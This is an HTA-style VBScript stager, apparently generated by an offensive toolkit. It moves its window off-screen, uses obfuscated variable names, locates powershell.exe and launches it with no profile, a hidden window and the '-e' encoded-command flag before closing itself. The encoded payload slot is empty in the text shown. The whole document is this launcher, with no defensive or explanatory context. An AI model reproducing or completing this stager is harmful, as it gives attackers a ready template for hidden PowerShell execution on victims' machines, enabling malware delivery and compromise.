<script language="VBScript">
  window.moveTo -4000, -4000
  Set dCG_ZXBGM4 = CreateObject("Wscript.Shell")
  Set hllau2E = CreateObject("Scripting.FileSystemObject")
  For each path in Split(dCG_ZXBGM4.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If hllau2E.FileExists(path + "\..\powershell.exe") Then
      dCG_ZXBGM4.Run "powershell.exe -nop -w hidden -e ",0
      Exit For
    End If
  Next
  window.close()
</script>
